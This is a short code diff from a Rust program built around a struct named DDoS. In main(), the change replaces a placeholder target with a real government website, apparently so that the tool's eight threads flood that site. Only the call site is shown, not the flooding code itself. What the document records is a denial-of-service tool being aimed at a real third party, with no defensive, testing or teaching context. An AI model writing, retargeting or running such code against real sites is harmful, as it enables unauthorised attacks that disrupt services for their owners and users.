@@ -98,7 +98,7 @@ impl DDoS {
 }
 
 fn main() {
-    let mut ddos: DDoS = DDoS::new("http://somesite.com", 8).unwrap();
+    let mut ddos: DDoS = DDoS::new("http://kremlin.ru/", 8).unwrap();
     ddos.run();
     thread::sleep(Duration::from_millis(4000));
     let result = ddos.result();
